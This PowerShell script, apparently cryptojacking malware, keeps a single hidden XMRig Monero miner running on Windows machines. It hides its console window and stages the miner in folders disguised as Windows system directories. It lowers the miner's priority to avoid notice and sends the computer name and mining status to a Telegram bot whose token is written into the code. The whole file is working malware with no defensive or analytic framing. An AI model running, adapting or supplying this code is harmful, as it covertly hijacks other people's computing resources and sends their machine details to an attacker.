# Single Instance XMRig Manager
# Ensures only one XMRig process runs at any time
# Completely invisible operation

param(
    [switch]$Startup,
    [switch]$Monitor,
    [int]$MonitorInterval = 30
)

# Hide PowerShell window completely
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

$ErrorActionPreference = "SilentlyContinue"

# Mining locations in priority order
$MiningLocations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
    "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.system",
    "C:\ProgramData\Microsoft\Network\Downloader",
    "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
)

# Telegram settings
$TelegramToken = "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
$ChatID = "8112985977"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] $Message"
    # Silent logging to avoid any visible output
    try {
        $logEntry | Out-File -FilePath "$env:TEMP\audio_service.log" -Append -Encoding UTF8
    } catch { }
}

function Send-TelegramMessage {
    param([string]$Message)
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/sendMessage"
        $body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        Invoke-RestMethod -Uri $uri -Method Post -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Telegram send failed: $($_.Exception.Message)"
        return $false
    }
}

function Get-XMRigProcesses {
    return Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
}

function Stop-AllXMRigProcesses {
    $processes = Get-XMRigProcesses
    foreach ($proc in $processes) {
        try {
            Write-Log "Terminating XMRig process ID: $($proc.Id)"
            $proc | Stop-Process -Force
            Start-Sleep -Milliseconds 500
        } catch {
            Write-Log "Failed to terminate process $($proc.Id): $($_.Exception.Message)"
        }
    }
    
    # Double-check and force kill any remaining instances
    Start-Sleep -Seconds 2
    taskkill /f /im xmrig.exe >$null 2>&1
}

function Find-BestMinerLocation {
    foreach ($location in $MiningLocations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        $configPath = Join-Path $location "config.json"
        
        if ((Test-Path $xmrigPath) -and (Test-Path $configPath)) {
            Write-Log "Found miner at: $location"
            return @{
                ExePath = $xmrigPath
                ConfigPath = $configPath
                Location = $location
            }
        }
    }
    return $null
}

function Start-SingleXMRigInstance {
    # First, ensure no instances are running
    Stop-AllXMRigProcesses
    
    # Wait a moment for cleanup
    Start-Sleep -Seconds 3
    
    # Find the best location to run from
    $minerInfo = Find-BestMinerLocation
    if (-not $minerInfo) {
        Write-Log "ERROR: No valid miner installation found"
        return $false
    }
    
    Write-Log "Starting XMRig from: $($minerInfo.Location)"
    
    try {
        # Start miner with maximum invisibility
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $minerInfo.ExePath
        $processInfo.Arguments = "--config=`"$($minerInfo.ConfigPath)`""
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        if ($process) {
            Write-Log "XMRig started successfully - PID: $($process.Id)"
            
            # Set process to below normal priority to be less noticeable
            try {
                $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
            } catch { }
            
            return $true
        } else {
            Write-Log "Failed to start XMRig process"
            return $false
        }
        
    } catch {
        Write-Log "Exception starting XMRig: $($_.Exception.Message)"
        return $false
    }
}

function Test-SingleInstanceRunning {
    $processes = Get-XMRigProcesses
    
    if ($processes.Count -eq 0) {
        Write-Log "No XMRig instances running"
        return $false
    } elseif ($processes.Count -eq 1) {
        Write-Log "Single XMRig instance running - PID: $($processes[0].Id)"
        return $true
    } else {
        Write-Log "Multiple XMRig instances detected ($($processes.Count)) - cleaning up"
        # Keep only the first process, terminate others
        for ($i = 1; $i -lt $processes.Count; $i++) {
            try {
                $processes[$i] | Stop-Process -Force
                Write-Log "Terminated duplicate process: $($processes[$i].Id)"
            } catch { }
        }
        return $true
    }
}

function Start-MonitoringLoop {
    Write-Log "Starting monitoring loop - interval: $MonitorInterval seconds"
    
    while ($true) {
        try {
            if (-not (Test-SingleInstanceRunning)) {
                Write-Log "No XMRig running - attempting to start"
                if (Start-SingleXMRigInstance) {
                    Write-Log "XMRig restarted successfully"
                } else {
                    Write-Log "Failed to restart XMRig"
                }
            }
            
            # Brief health check every few cycles
            if ((Get-Random -Maximum 10) -eq 0) {
                $processes = Get-XMRigProcesses
                if ($processes.Count -eq 1) {
                    $cpuUsage = (Get-Counter "\Process(xmrig)\% Processor Time" -ErrorAction SilentlyContinue).CounterSamples.CookedValue
                    if ($cpuUsage) {
                        Write-Log "Health check - CPU usage: $([math]::Round($cpuUsage, 1))%"
                    }
                }
            }
            
        } catch {
            Write-Log "Monitoring loop error: $($_.Exception.Message)"
        }
        
        Start-Sleep -Seconds $MonitorInterval
    }
}

# Main execution logic
Write-Log "Single Instance Manager started - PID: $PID"

if ($Startup) {
    Write-Log "Startup mode - initializing single instance"
    
    # Send startup notification
    $computerName = $env:COMPUTERNAME
    $message = "🔄 <b>SINGLE INSTANCE STARTUP</b>`n💻 PC: $computerName`n⏰ Time: $(Get-Date -Format 'HH:mm:ss')`n🎯 Status: Initializing invisible mining..."
    Send-TelegramMessage -Message $message
    
    # Wait a moment for system to settle
    Start-Sleep -Seconds 10
    
    # Start the single instance
    if (Start-SingleXMRigInstance) {
        Write-Log "Startup successful - single instance running"
        $message = "✅ <b>MINING ACTIVE</b>`n💻 PC: $computerName`n🔥 Status: Single instance running invisibly`n⚡ Expected: 5000-7000 H/s"
        Send-TelegramMessage -Message $message
    } else {
        Write-Log "Startup failed"
        $message = "❌ <b>STARTUP FAILED</b>`n💻 PC: $computerName`n⚠️ Status: Unable to start miner"
        Send-TelegramMessage -Message $message
    }
    
    # Continue with monitoring
    Start-MonitoringLoop
    
} elseif ($Monitor) {
    Write-Log "Monitor mode - checking existing instances"
    Test-SingleInstanceRunning
    Start-MonitoringLoop
    
} else {
    # Default: ensure single instance is running
    Write-Log "Default mode - ensuring single instance"
    Test-SingleInstanceRunning
    if (-not (Get-XMRigProcesses)) {
        Start-SingleXMRigInstance
    }
}
